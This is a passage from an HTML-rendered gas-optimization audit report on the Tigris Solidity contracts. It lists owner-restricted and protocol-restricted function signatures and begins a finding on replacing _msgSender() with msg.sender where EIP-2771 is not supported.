class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">64            </span><span class=\"mtk12\">uint</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_percent</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">65:       ) </span><span class=\"mtk11\">external</span><span class=\"mtk1\"> </span><span class=\"mtk11\">onlyProtocol</span><span class=\"mtk1\"> </span><span class=\"mtk11\">returns</span><span class=\"mtk1\"> (IPosition.Trade </span><span class=\"mtk12\">memory</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_trade</span><span class=\"mtk1\">, </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_positionSize</span><span class=\"mtk1\">, </span><span class=\"mtk12\">int256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_payout</span><span class=\"mtk1\">) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">126</span><span class=\"mtk1\">       </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">modifyShortOi</span><span class=\"mtk1\">(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">127           </span><span class=\"mtk12\">uint</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_asset</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">128           </span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_tigAsset</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">129           </span><span class=\"mtk12\">bool</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_onOpen</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">130           </span><span class=\"mtk12\">uint</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_size</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">131:      ) </span><span class=\"mtk11\">public</span><span class=\"mtk1\"> </span><span class=\"mtk11\">onlyProtocol</span><span class=\"mtk1\"> {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">135</span><span class=\"mtk1\">       </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">modifyLongOi</span><span class=\"mtk1\">(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">136           </span><span class=\"mtk12\">uint</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_asset</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">137           </span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_tigAsset</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">138           </span><span class=\"mtk12\">bool</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_onOpen</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">139           </span><span class=\"mtk12\">uint</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_size</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">140:      ) </span><span class=\"mtk11\">public</span><span class=\"mtk1\"> </span><span class=\"mtk11\">onlyProtocol</span><span class=\"mtk1\"> {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">144</span><span class=\"mtk1\">:      </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">setMaxGasPrice</span><span class=\"mtk1\">(</span><span class=\"mtk12\">uint</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_maxGasPrice</span><span class=\"mtk1\">) </span><span class=\"mtk11\">external</span><span class=\"mtk1\"> </span><span class=\"mtk11\">onlyOwner</span><span class=\"mtk1\"> {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">190</span><span class=\"mtk1\">       </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">_setReferral</span><span class=\"mtk1\">(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">191           </span><span class=\"mtk12\">bytes32</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_referral</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">192           </span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_trader</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">193:      ) </span><span class=\"mtk11\">external</span><span class=\"mtk1\"> </span><span class=\"mtk11\">onlyProtocol</span><span class=\"mtk1\"> {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">222</span><span class=\"mtk1\">       </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">setValidSignatureTimer</span><span class=\"mtk1\">(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">223           </span><span class=\"mtk12\">uint</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_validSignatureTimer</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">224       )</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">225           </span><span class=\"mtk11\">external</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">226:          </span><span class=\"mtk11\">onlyOwner</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">231:      </span><span class=\"mtk11\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">setChainlinkEnabled</span><span class=\"mtk1\">(</span><span class=\"mtk12\">bool</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_bool</span><span class=\"mtk1\">) </span><span class=\"mtk11\">external</span><span class=\"mtk1\"> </span><span class=\"mtk11\">onlyOwner</span><span class=\"mtk1\"> {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">240</span><span class=\"mtk1\">:      </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">setNode</span><span class=\"mtk1\">(</span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_node</span><span class=\"mtk1\">, </span><span class=\"mtk12\">bool</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_bool</span><span class=\"mtk1\">) </span><span class=\"mtk11\">external</span><span class=\"mtk1\"> </span><span class=\"mtk11\">onlyOwner</span><span class=\"mtk1\"> {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">249</span><span class=\"mtk1\">       </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">setAllowedMargin</span><span class=\"mtk1\">(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">250           </span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_tigAsset</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">251           </span><span class=\"mtk12\">bool</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_bool</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">252       ) </span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">253           </span><span class=\"mtk11\">external</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">254:          </span><span class=\"mtk11\">onlyOwner</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">264       </span><span class=\"mtk11\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">setMinPositionSize</span><span class=\"mtk1\">(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">265           </span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_tigAsset</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">266           </span><span class=\"mtk12\">uint</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_min</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">267       ) </span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">268           </span><span class=\"mtk11\">external</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">269:          </span><span class=\"mtk11\">onlyOwner</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">274:      </span><span class=\"mtk11\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">setPaused</span><span class=\"mtk1\">(</span><span class=\"mtk12\">bool</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_paused</span><span class=\"mtk1\">) </span><span class=\"mtk11\">external</span><span class=\"mtk1\"> </span><span class=\"mtk11\">onlyOwner</span><span class=\"mtk1\"> {</span></span></span></code></pre>\n<p>https:/github.com/code-423n4/2022-12-tigris/blob/496e1974ee3838be8759e7b4096dbee1b8795593/contracts/TradingExtension.sol#L61-L65</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"178\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">File: </span><span class=\"mtk12\">contracts</span><span class=\"mtk1\">/</span><span class=\"mtk12\">Trading</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">898</span><span class=\"mtk1\">       </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">setBlockDelay</span><span class=\"mtk1\">(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">899           </span><span class=\"mtk12\">uint</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_blockDelay</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">900       )</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">901           </span><span class=\"mtk11\">external</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">902:          </span><span class=\"mtk11\">onlyOwner</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">912       </span><span class=\"mtk11\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">setAllowedVault</span><span class=\"mtk1\">(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">913           </span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_stableVault</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">914           </span><span class=\"mtk12\">bool</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_bool</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">915       )</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">916           </span><span class=\"mtk11\">external</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">917:          </span><span class=\"mtk11\">onlyOwner</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">926       </span><span class=\"mtk11\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">setMaxWinPercent</span><span class=\"mtk1\">(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">927           </span><span class=\"mtk12\">uint</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_maxWinPercent</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">928       )</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">929           </span><span class=\"mtk11\">external</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">930:          </span><span class=\"mtk11\">onlyOwner</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">939:      </span><span class=\"mtk11\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">setLimitOrderPriceRange</span><span class=\"mtk1\">(</span><span class=\"mtk12\">uint</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_range</span><span class=\"mtk1\">) </span><span class=\"mtk11\">external</span><span class=\"mtk1\"> </span><span class=\"mtk11\">onlyOwner</span><span class=\"mtk1\"> {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">952</span><span class=\"mtk1\">:      </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">setFees</span><span class=\"mtk1\">(</span><span class=\"mtk12\">bool</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_open</span><span class=\"mtk1\">, </span><span class=\"mtk12\">uint</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_daoFees</span><span class=\"mtk1\">, </span><span class=\"mtk12\">uint</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_burnFees</span><span class=\"mtk1\">, </span><span class=\"mtk12\">uint</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_referralFees</span><span class=\"mtk1\">, </span><span class=\"mtk12\">uint</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_botFees</span><span class=\"mtk1\">, </span><span class=\"mtk12\">uint</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_percent</span><span class=\"mtk1\">) </span><span class=\"mtk11\">external</span><span class=\"mtk1\"> </span><span class=\"mtk11\">onlyOwner</span><span class=\"mtk1\"> {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">975</span><span class=\"mtk1\">       </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">setTradingExtension</span><span class=\"mtk1\">(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">976           </span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_ext</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">977:      ) </span><span class=\"mtk11\">external</span><span class=\"mtk1\"> </span><span class=\"mtk11\">onlyOwner</span><span class=\"mtk1\">() {</span></span></span></code></pre>\n<p>https:/github.com/code-423n4/2022-12-tigris/blob/496e1974ee3838be8759e7b4096dbee1b8795593/contracts/Trading.sol#L898-L902</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"179\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">File: </span><span class=\"mtk12\">contracts</span><span class=\"mtk1\">/</span><span class=\"mtk12\">utils</span><span class=\"mtk1\">/</span><span class=\"mtk12\">MetaContext</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">9</span><span class=\"mtk1\">:        </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">setTrustedForwarder</span><span class=\"mtk1\">(</span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_forwarder</span><span class=\"mtk1\">, </span><span class=\"mtk12\">bool</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_bool</span><span class=\"mtk1\">) </span><span class=\"mtk11\">external</span><span class=\"mtk1\"> </span><span class=\"mtk11\">onlyOwner</span><span class=\"mtk1\"> {</span></span></span></code></pre>\n<p>https:/github.com/code-423n4/2022-12-tigris/blob/496e1974ee3838be8759e7b4096dbee1b8795593/contracts/utils/MetaContext.sol#L9</p>\n<h2 id=\"g22--dont-use-_msgsender-if-not-supporting-eip-2771\" style=\"position:relative;\"><a href=\"#g22--dont-use-_msgsender-if-not-supporting-eip-2771\" aria-label=\"g22  dont use _msgsender if not supporting eip 2771 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>[G‑22]  Don’t use <code>_msgSender()</code> if not supporting EIP-2771</h2>\n<p>Use <code>msg.sender</code> if the code does not implement <a href=\"https://eips.ethereum.org/EIPS/eip-2771\">EIP-2771 trusted forwarder</a> support</p>\n<p><em>There are 30 instances of this issue:</em></p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"180\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">File: </span><span class=\"mtk12\">contracts</span><span class=\"mtk1\">/</span><span class=\"mtk12\">BondNFT</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">216</span><span class=\"mtk1\">:          </span><span class=\"mtk11\">IERC20</span><span class=\"mtk1\">(</span><span class=\"mtk12\">_tigAsset</span><span class=\"mtk1\">).</span><span class=\"mtk11\">transferFrom</span><span class=\"mtk1\">(</span><span class=\"mtk11\">_msgSender</span><span class=\"mtk1\">(), </span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk4\">this</span><span class=\"mtk1\">), </span><span class=\"mtk12\">_amount</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">285</span><span class=\"mtk1\">:                  </span><span class=\"mtk11\">_transfer</span><span class=\"mtk1\">(</span><span class=\"mtk11\">_msgSender</span><span class=\"mtk1\">(), </span><span class=\"mtk12\">_to</span><span class=\"mtk1\">, </span><span class=\"mtk12\">_ids</span><span class=\"mtk1\">[</span><span class=\"mtk12\">i</span><span class=\"mtk1\">]);</span></span></span></code></pre>\n<p>https:/github.com/code-423n4/2022-12-tigris/blob/496e1974ee3838be8759e7b4096dbee1b8795593/contracts/BondNFT.sol#L216</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"181\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">File: </span><span class=\"mtk12\">contracts</span><span class=\"mtk1\">/</span><span class=\"mtk12\">GovNFT</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">65</span><span class=\"mtk1\">:           </span><span class=\"mtk11\">require</span><span class=\"mtk1\">(</span><span class=\"mtk12\">msg</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sender</span><span class=\"mtk1\"> == </span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk4\">this</span><span class=\"mtk1\">) || </span><span class=\"mtk11\">_msgSender</span><span class=\"mtk1\">() == </span><span class=\"mtk11\">owner</span><span class=\"mtk1\">(), </span><span class=\"mtk8\">&quot;NotBridge&quot;</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">106</span><span class=\"mtk1\">:              </span><span class=\"mtk11\">_mint</span><span class=\"mtk1\">(</span><span class=\"mtk11\">_msgSender</span><span class=\"mtk1\">(), </span><span class=\"mtk12\">counter</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">111</span><span class=\"mtk1\">:          </span><span class=\"mtk11\">_mint</span><span class=\"mtk1\">(</span><span class=\"mtk11\">_msgSender</span><span class=\"mtk1\">(), </span><span class=\"mtk12\">counter</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">132</span><span class=\"mtk1\">:              </span><span class=\"mtk11\">require</span><span class=\"mtk1\">(</span><span class=\"mtk11\">_msgSender</span><span class=\"mtk1\">() == </span><span class=\"mtk11\">ownerOf</span><span class=\"mtk1\">(</span><span class=\"mtk12\">tokenId</span><span class=\"mtk1\">[</span><span class=\"mtk12\">i</span><span class=\"mtk1\">]), </span><span class=\"mtk8\">&quot;Not the owner&quot;</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">161</span><span class=\"mtk1\">:              </span><span class=\"mtk11\">payable</span><span class=\"mtk1\">(</span><span class=\"mtk11\">_msgSender</span><span class=\"mtk1\">()),</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">174</span><span class=\"mtk1\">:          </span><span class=\"mtk11\">require</span><span class=\"mtk1\">(</span><span class=\"mtk11\">_msgSender</span><span class=\"mtk1\">() == </span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk12\">endpoint</span><span class=\"mtk1\">), </span><span class=\"mtk8\">&quot;!Endpoint&quot;</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">247</span><span class=\"mtk1\">:              </span><span class=\"mtk11\">_transfer</span><span class=\"mtk1\">(</span><span class=\"mtk11\">_msgSender</span><span class=\"mtk1\">(), </span><span class=\"mtk12\">_to</span><span class=\"mtk1\">, </span><span class=\"mtk12\">_ids</span><span class=\"mtk1\">[</span><span class=\"mtk12\">i</span><span class=\"mtk1\">]);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">276</span><span class=\"mtk1\">:          </span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_msgsender</span><span class=\"mtk1\"> = </span><span class=\"mtk11\">_msgSender</span><span class=\"mtk1\">();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">289</span><span class=\"mtk1\">:          </span><span class=\"mtk15\">try</span><span class=\"mtk1\"> </span><span class=\"mtk11\">IERC20</span><span class=\"mtk1\">(</span><span class=\"mtk12\">_tigAsset</span><span class=\"mtk1\">).</span><span class=\"mtk11\">transferFrom</span><span class=\"mtk1\">(</span><span class=\"mtk11\">_msgSender</span><span class=\"mtk1\">(), </span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk4\">this</span><span class=\"mtk1\">), </span><span class=\"mtk12\">_amount</span><span class=\"mtk1\">) {</span></span></span></code></pre>\n<p>https:/github.com/code-423n4/2022-12-tigris/blob/496e1974ee3838be8759e7b4096dbee1b8795593/contracts/GovNFT.sol#L65</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"182\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">File: </span><span class=\"mtk12\">contracts</span><span class=\"mtk1\">/</span><span class=\"mtk12\">PairsContract</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">190</span><span class=\"mtk1\">:          </span><span class=\"mtk11\">require</span><span class=\"mtk1\">(</span><span class=\"mtk11\">_msgSender</span><span class=\"mtk1\">() == </span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk12\">protocol</span><span class=\"mtk1\">), </span><span class=\"mtk8\">&quot;!Protocol&quot;</span><span class=\"mtk1\">);</span></span></span></code></pre>\n<p>https:/github.com/code-423n4/2022-12-tigris/blob/496e1974ee3838be8759e7b4096dbee1b8795593/contracts/PairsContract.sol#L190</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"183\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">File: </span><span class=\"mtk12\">contracts</span><span class=\"mtk1\">/</span><span class=\"mtk12\">Position</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">315</span><span class=\"mtk1\">:          </span><span class=\"mtk11\">require</span><span class=\"mtk1\">(</span><span class=\"mtk12\">_isMinter</span><span class=\"mtk1\">[</span><span class=\"mtk11\">_msgSender</span><span class=\"mtk1\">()], </span><span class=\"mtk8\">&quot;!Minter&quot;</span><span class=\"mtk1\">);</span></span></span></code></pre>\n<p>https:/github.com/code-423n4/2022-12-tigris/blob/496e1974ee3838be8759e7b4096dbee1b8795593/contracts/Position.sol#L315</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"184\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">File: </span><span class=\"mtk12\">contracts</span><span class=\"mtk1\">/</span><span class=\"mtk12\">Referrals</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">22</span><span class=\"mtk1\">:           </span><span class=\"mtk12\">_referral</span><span class=\"mtk1\">[</span><span class=\"mtk12\">_hash</span><span class=\"mtk1\">] = </span><span class=\"mtk11\">_msgSender</span><span class=\"mtk1\">();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">23</span><span class=\"mtk1\">:           </span><span class=\"mtk12\">emit</span><span class=\"mtk1\"> </span><span class=\"mtk11\">ReferralCreated</span><span class=\"mtk1\">(</span><span class=\"mtk11\">_msgSender</span><span class=\"mtk1\">(), </span><span class=\"mtk12\">_hash</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">81</span><span class=\"mtk1\">:           </span><span class=\"mtk11\">require</span><span class=\"mtk1\">(</span><span class=\"mtk11\">_msgSender</span><span class=\"mtk1\">() == </span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk12\">protocol</span><span class=\"mtk1\">), </span><span 